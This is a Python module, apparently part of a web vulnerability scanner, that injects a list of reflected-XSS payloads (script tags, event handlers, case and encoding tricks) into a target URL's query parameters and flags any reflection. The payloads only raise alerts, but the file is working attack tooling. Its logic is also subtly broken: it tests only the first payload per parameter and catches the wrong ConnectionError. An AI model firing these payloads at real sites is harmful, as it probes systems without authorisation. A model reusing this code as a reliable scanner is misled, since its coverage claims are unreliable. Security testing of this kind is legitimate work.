from random import choices, randint
from string import ascii_letters

from requests import get


class TestXSS:
    def __init__(self, log, console) -> None:
        self.log = log
        self.console = console
        self.tested_urls = []
        self.xss_test = [
            r"<script>alert('PAYLOAD')</script>",
            r"\\\";alert('PAYLOAD');//",
            r"</TITLE><SCRIPT>alert('PAYLOAD');</SCRIPT>",
            r"<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('PAYLOAD');\">",
            r"<BR SIZE=\"&{alert('PAYLOAD')}\">",
            r"<%<!--'%><script>alert('PAYLOAD');</script -->",
            r"<ScRiPt>alErT('PAYLOAD')</sCriPt>",
            r"<IMG SRC=jAVasCrIPt:alert('PAYLOAD')>",
            r"<img src=1 href=1 onerror=\"javascript:alert('PAYLOAD')\"></img>",
            r"<applet onError applet onError=\"javascript:javascript:alert"
            + r"('PAYLOAD')\"></applet onError>",
            r"<scr<script>ipt>alert('PAYLOAD')</scr</script>ipt>",
            r"<<SCRIPT>alert('PAYLOAD');//<</SCRIPT>",
            r"<embed code=javascript:javascript:alert('PAYLOAD');></embed>",
            r"<BODY onload!#$%%&()*~+-_.,:;?@[/|\\]^`=javascript:"
            + r"alert('PAYLOAD')>",
            r"<BODY ONLOAD=javascript:alert('PAYLOAD')>",
            r"<img src=\"javascript:alert('PAYLOAD')\">",
            r"\"`'><script>\\x21javascript:alert('PAYLOAD')</script>",
            r"`\"'><img src='#\\x27 onerror=javascript:alert('PAYLOAD')>",
            r"alert;pg('PAYLOAD')",
            r"¼script¾alert(¢PAYLOAD¢)¼/script¾",
            r"d=\\\"alert('PAYLOAD');\\\\\")\\\";",
            r"&lt;DIV STYLE=\\\"background-image&#58; url(javascript&#058;"
            + r"alert('PAYLOAD'))\\\"&gt;",
        ]

    def exploit_xss(self, base_url, url_params) -> None:
        for param in url_params:
            for test in self.xss_test:
                param_no_value = param.split("=")[0]
                payload_length = randint(5, 15)
                payload_text = "".join(choices(ascii_letters, k=payload_length))
                payload = test.replace("PAYLOAD", payload_text)
                main_url = f"{base_url}?{param_no_value}"

                if not main_url in self.tested_urls:
                    self.tested_urls.append(main_url)
                    test_url = f"{main_url}={payload}"
                else:
                    continue

                try:
                    response = get(test_url)
                except ConnectionError:
                    self.log.logger(
                        "error", f"Connection error raised on: {test_url}, skipping"
                    )
                    continue
                else:
                    if response.text.find(payload_text) != -1:
                        self.console.print(
                            f"[red][[/red][green]+[/green][red]][/red]"
                            + f" [white]XSS :[/white] {test_url}"
                        )
                        break

    def test_xss(self, url) -> None:
        """
        Tets for XSS
        """
        base_url, params = url.split("?")[0], url.split("?")[1]
        params_dict = params.split("&")
        self.exploit_xss(base_url, params_dict)
